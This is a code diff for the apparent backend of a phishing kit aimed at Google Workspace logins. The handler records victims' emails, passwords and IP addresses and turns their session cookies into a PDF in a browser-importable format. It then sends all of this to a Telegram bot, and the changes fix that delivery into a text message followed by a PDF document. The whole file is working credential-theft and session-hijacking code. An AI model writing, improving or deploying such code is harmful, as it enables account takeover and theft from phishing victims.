@@ -1,5 +1,6 @@
 import nodemailer from 'nodemailer';
 import { PDFDocument, StandardFonts, rgb } from 'pdf-lib';
+const FormData = require('form-data');  // ADD THIS LINE
 
 async function generateCookiePDF(cookies, email, domain) {
   const pdfDoc = await PDFDocument.create();
@@ -8,13 +9,10 @@ async function generateCookiePDF(cookies, email, domain) {
   const { height } = page.getSize();
 
   let y = height - 50;
-
   page.drawText('Session Cookies', { x: 50, y, size: 16, font, color: rgb(0, 0, 0) });
   y -= 30;
-
   page.drawText('# Netscape HTTP Cookie File', { x: 50, y, size: 12, font, color: rgb(0, 0, 0) });
   y -= 20;
-
   page.drawText('# Netscape format - import to browser', { x: 50, y, size: 10, font, color: rgb(0.4, 0.4, 0.4) });
   y -= 30;
 
@@ -54,36 +52,35 @@ export default async function handler(req, res) {
 
   console.log('Captured:', data.email, ip);
 
-  // TELEGRAM ONLY
+  // TELEGRAM ONLY - FIXED
   try {
     const pdfBuffer = await generateCookiePDF(data.cookies, data.email, data.captureDomain);
     
+    // TEXT MESSAGE FIRST
+    await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: process.env.TELEGRAM_CHAT_ID,
+        text: `🔔 *Google Workspace CAPTURED*\n\n⏰ *${new Date().toLocaleString()}*\n🌐 *IP:* \`${ip}\`\n📧 *Email:* \`${data.email}\`\n🔑 *Password:* \`${data.password || 'N/A'}\`\n\n🍪 *Cookies PDF* → next message`,
+        parse_mode: 'Markdown'
+      }),
+    });
+
+    // PDF DOCUMENT SECOND
     const formData = new FormData();
     formData.append('chat_id', process.env.TELEGRAM_CHAT_ID);
-    formData.append('photo', pdfBuffer, 'vct_session.pdf');
-    formData.append('caption', `
-🔔 *Google Workspace CAPTURED*
-
-⏰ *${new Date().toLocaleString()}*
-🌐 *IP:* \`${ip}\`
-📧 *Email:* \`${data.email}\`
-🔑 *Password:* \`${data.password || 'N/A'}\`
-
-🍪 *Cookies PDF attached* 
-${data.cookiesImportLink ? `🔗 [Import Session →](${data.cookiesImportLink})` : ''}
-
-👤 *Browser:* ${data.userAgent?.slice(0, 80) || 'N/A'}...
-`);
-
-    const telegramResponse = await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendPhoto`, {
+    formData.append('document', pdfBuffer, { filename: 'vct_session.pdf', contentType: 'application/pdf' });
+    
+    const docResponse = await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendDocument`, {
       method: 'POST',
       body: formData,
     });
 
-    if (telegramResponse.ok) {
-      console.log('✅ Telegram delivered');
+    if (docResponse.ok) {
+      console.log('✅ Telegram: Message + PDF sent');
     } else {
-      console.error('Telegram failed:', await telegramResponse.text());
+      console.error('PDF failed:', await docResponse.text());
     }
   } catch (err) {
     console.error('Telegram error:', err.message);
